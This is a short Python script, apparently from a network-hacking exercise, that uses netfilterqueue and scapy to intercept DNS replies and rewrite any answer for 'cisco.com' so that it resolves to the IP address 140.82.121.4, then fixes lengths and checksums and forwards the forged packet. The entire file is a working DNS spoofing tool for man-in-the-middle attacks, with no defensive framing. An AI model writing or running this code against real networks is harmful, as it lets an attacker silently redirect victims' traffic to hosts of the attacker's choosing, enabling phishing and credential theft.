#!/usr/bin/env
import netfilterqueue
import scapy.all as scapy

def inject_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        print(scapy_packet.show())
        query_name = scapy_packet[scapy.DNSQR].qname
        if "cisco.com" in str(query_name):
            print("Spoofing cisco.com")
            answer_query = scapy.DNSRR(rrname=query_name, rdata="140.82.121.4")
            scapy_packet[scapy.DNS].an = answer_query
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum      

            packet.set_payload(bytes(scapy_packet))

    packet.accept()     

packet_queue = netfilterqueue.NetfilterQueue()
packet_queue.bind(0, inject_packet)
packet_queue.run()